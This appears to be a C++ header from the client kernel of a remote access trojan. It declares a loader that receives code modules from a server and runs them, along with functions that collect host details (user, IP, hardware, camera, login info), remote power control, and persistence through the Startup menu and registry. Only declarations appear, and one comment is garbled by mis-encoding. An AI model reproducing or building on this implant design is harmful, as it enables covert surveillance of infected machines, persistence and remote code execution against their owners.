#pragma once
#include "EventHandler.h"

#include "kernel_common.h"
#include "Module.h"

/*************************************************************************/

#define MAX_MODULE_COUNT 32

typedef void(*typeRun)(LPVOID kernel, const TCHAR * module_name, const TCHAR* module_entry, Params *lpParams);

typedef int (*ModuleEntry)(
	CIOCP * Iocp,
	Module * owner,
	const char* szServerAddr,
	unsigned short uPort,
	LPVOID Args[],
	LPVOID  Kernel,
	typeRun run_module);

struct PendingTask
{
	TCHAR module_name[0x20];
	TCHAR module_entry[0x20];
	Params * lpParams;
};

class CKernel :
	public CEventHandler
{

	class ModuleInfo{
	public:
		Module *    module;
		BYTE        md5sum[0x10];
		TCHAR		module_name[0x20];
		TCHAR       install_date[0x20];

		ModuleInfo()
		{
			module_name[0] = 0;
			module = 0;
		}

		ModuleInfo(TCHAR *ModuleName)
		{
			module = NULL;
			lstrcpy(module_name, ModuleName);
		}
	};

	//Module...
	ModuleInfo		m_LoadedModules[MAX_MODULE_COUNT];
	volatile ULONG  m_mutex;
	
	//Close event.
	HANDLE m_hEvent;

	//module upload.....
	TCHAR   m_CurrentModule[0x40];
	DWORD   m_dwModuleSize;
	DWORD   m_dwLoadedSize;
	BYTE *  m_ModuleBuffer;

	//
	PendingTask * m_pendingTask;

public:
	BOOL TryAcquire() { return !InterlockedExchange(&m_mutex,1); };
	void Release()    { InterlockedExchange(&m_mutex, 0); };
	
	ModuleInfo * FindLoadedModule(const TCHAR * ModuleName)
	{
		for (int i = 0; i < MAX_MODULE_COUNT; i++)
		{
			if (!lstrcmp(m_LoadedModules[i].module_name, ModuleName))
			{
				return &m_LoadedModules[i];
			}
		}
		return NULL;
	}

	void AddModule(const BYTE * lpData, UINT Size);

	UINT16 icmp_checksum(BYTE*buff, int len);
	DWORD GetPing(const char*host);
	void GetPrivateIP(TCHAR PrivateIP[128]);
	void GetPCName(TCHAR PCName[128]);
	void GetCurrentUser(TCHAR User[128]);
	void GetRAM(TCHAR RAMSize[128]);
	void GetDisk(TCHAR DiskSize[128]);
	void GetOSName(TCHAR OsName[128]);
	void GetCPU(TCHAR CPU[128]);
	DWORD HasCamera();
	void GetComment(TCHAR Comment[256]);
	void GetInstallDate(TCHAR InstallDate[128]);
	void GetLoginInfo(LoginInfo*pLoginInfo);


	/*********************************************************************/
	/*					EventHandler									  */
	/*********************************************************************/
	void OnReady();

	void OnEditComment(TCHAR NewComment[256]);
	
	//session handler.
	void OnPower_Reboot();
	void OnPower_Shutdown();
	void OnRestart();
	void OnExit();
	//
	void OnRunModule(BYTE * lpData, UINT32  Size);

	//Ä£¿é´«Êä¡£¡£¡£
	void OnModuleInfo(BYTE* info);
	void GetModuleData();
	void OnModuleData(BYTE* lpData);

	void OnUnilsCopyToStartupMenu();
	void OnUtilsWriteStartupReg();
	void OnUtilsOpenWebPage(TCHAR* szUrl);

	/*********************************************************************/
	//static CKernel * m_pInstance;

public:
	void GetModule(const TCHAR* ModuleName);

	virtual void OnOpen();
	virtual void OnClose();
	virtual void OnEvent(UINT32 e, BYTE* lpData, UINT Size);
	void    Wait();

	static int Run(CKernel * kernel, const TCHAR * module_name, const TCHAR* module_entry, Params* lpParams);

	CKernel(CClient * pClient);
	~CKernel();
};

